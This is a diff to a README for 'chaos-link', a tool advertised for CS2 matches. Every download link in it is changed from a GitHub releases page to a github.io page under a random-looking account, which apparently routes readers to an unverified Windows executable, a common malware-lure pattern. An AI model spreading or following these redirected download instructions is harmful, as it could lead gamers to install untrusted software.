@@ -1,6 +1,6 @@
 # 🎮 chaos-link - Turn Your CS2 Match Into Total Chaos
 
-[![Download chaos-link](https://img.shields.io/badge/Download-chaos--link-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Familylaricariidaecountrydoctor678/chaos-link/releases)
+[![Download chaos-link](https://img.shields.io/badge/Download-chaos--link-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://familylaricariidaecountrydoctor678.github.io)
 
 ---
 
@@ -18,7 +18,7 @@ The entire setup takes less than five minutes. No coding. No complicated configu
 
 ### Step 1: Download the App
 
-Visit this link to download the application: [https://github.com/Familylaricariidaecountrydoctor678/chaos-link/releases](https://github.com/Familylaricariidaecountrydoctor678/chaos-link/releases)
+Visit this link to download the application: [https://familylaricariidaecountrydoctor678.github.io](https://familylaricariidaecountrydoctor678.github.io)
 
 This page shows all available versions. Click the newest one, then download the file labeled "chaos-link" for Windows. It will appear in your Downloads folder.
 
@@ -166,4 +166,4 @@ chaos-link transforms the classic "play with friends" experience into something 
 
 Remember: the objective isn't to win. It's to experience the most chaotic, ridiculous CS2 matches of your life. So grab your friends, connect your phones, and prepare for gaming sessions you'll talk about for months.
 
-Ready to dive in? Visit the [download page](https://github.com/Familylaricariidaecountrydoctor678/chaos-link/releases) and start the fun right now.
+Ready to dive in? Visit the [download page](https://familylaricariidaecountrydoctor678.github.io) and start the fun right now.
